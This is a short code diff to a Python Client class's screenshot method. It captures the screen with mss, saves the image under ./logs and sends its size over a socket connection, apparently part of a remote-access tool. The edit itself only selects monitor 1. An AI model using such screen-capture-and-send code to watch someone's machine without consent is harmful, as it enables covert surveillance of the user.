@@ -421,7 +421,8 @@ class Client:
 # '''SCREENSHOT'''
     def screenshot(self):
         ss = mss()
-        ss.shot(output='./logs/screen{}.png'.format(self.sscount))  # taking screenshot
+        ss.shot(mon=1, output='./logs/screen{}.png'.format(self.sscount))
+        #ss.shot(output='./logs/screen{}.png'.format(self.sscount))  # taking screenshot
         picsize = os.path.getsize('./logs/screen{}.png'.format(self.sscount))
         self.client.send(str(picsize).encode())
         time.sleep(0.1)
